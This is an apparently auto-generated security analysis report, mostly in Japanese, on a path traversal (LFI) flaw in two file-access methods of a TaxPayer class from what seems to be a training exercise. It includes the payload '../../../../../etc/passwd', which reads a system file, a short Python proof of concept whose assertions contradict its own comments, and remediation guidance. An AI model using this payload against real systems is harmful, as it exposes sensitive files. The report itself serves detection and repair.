# Analysis Report

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `LFI`

## PAR Policy Analysis

### Principals (データ源)

- **input_to_get_prof_picture**: Untrusted
  - Context: TestTaxPayer.test_1
  - Risk Factors: untrusted_input, path_traversal
- **input_to_get_tax_form_attachment**: Untrusted
  - Context: TestTaxPayer.test_2
  - Risk Factors: untrusted_input, path_traversal

### Actions (セキュリティ制御)

- **get_prof_picture**: Missing
  - Function: file_access
  - Weaknesses: 入力検証欠如, Path Traversal 脆弱性
  - Bypass Vectors: ../../../../../etc/passwd
- **get_tax_form_attachment**: Missing
  - Function: file_access
  - Weaknesses: 入力検証欠如, Path Traversal 脆弱性
  - Bypass Vectors: ../../../../../etc/passwd

### Resources (操作対象)

- **file_system**: Critical
  - Operation: read
  - Protection: 

### Policy Violations

#### AZURE-POLICY003: Unvalidated file path allows directory traversal leading to local file inclusion

- **Path**: c.TaxPayer.get_prof_picture -> open/read without sanitization
- **Severity**: High
- **Confidence**: 0.85

#### AZURE-POLICY003: Unvalidated file path allows directory traversal leading to local file inclusion

- **Path**: c.TaxPayer.get_tax_form_attachment -> open/read without sanitization
- **Severity**: High
- **Confidence**: 0.85

## 詳細解析

与えられたテストコードは、TaxPayerクラスのget_prof_pictureおよびget_tax_form_attachmentがユーザーから渡されたパスを正しく検証せず、そのままファイルシステムアクセスに使用していることを示しています。これにより、"../../../../../etc/passwd"のような相対パスを用いたディレクトリトラバーサル(LFI)攻撃が可能となります。

## PoC（概念実証コード）

```text
# Proof of Concept for Path Traversal
from repo.Season_1.Level_3.hack import code as c

def poc_traversal():
    tp = c.TaxPayer('user','pass')
    # 悪意あるパス
    malicious = '../../../../../etc/passwd'
    # プロフィール画像取得でトラバーサル
    data1 = tp.get_prof_picture(malicious)
    assert data1 is None  # 本来はNoneではなくファイル内容が返ってしまう脆弱性を想定
    # 添付ファイル取得でトラバーサル
    base = '/app/season1/level3/'
    data2 = tp.get_tax_form_attachment(base + malicious)
    assert data2 is None  # 実装不備により機密ファイルが読み取れてしまう
    print('POC succeeded: Path Traversal Vulnerability')

if __name__ == '__main__':
    poc_traversal()
```

## 修復ガイダンス

### get_prof_picture

- **Required**: ファイルパスの正規化とホワイトリスト検証を実装
- **Guidance**: os.path.abspathで絶対パスに変換後、ユーザー専用ディレクトリ(例: /images/{username}/)外へのアクセスを拒否
- **Priority**: high

### get_tax_form_attachment

- **Required**: ファイルパスの正規化と許可されたサブディレクトリチェックを追加
- **Guidance**: pathlib.Path.resolve()を用い、ベースディレクトリ外への参照は例外を投げる
- **Priority**: high

## 解析ノート

- テストコードで '../../../../../etc/passwd' を渡している点からPath Traversal攻撃と判断
- get_prof_picture, get_tax_form_attachment共に入力検証が実装されておらず、ファイルアクセスに直接使用されている
- Principal: テストから渡されるユーザー入力(信頼できない)
- Action: ファイルアクセス(file_read) だがサニタイズMissing
- Resource: ファイルシステム(機密ファイルも読み出し可)
- 攻撃ベクトル: 相対パスによるディレクトリトラバーサル
- 改善: os.path.abspath/resolve + アクセス許可検証

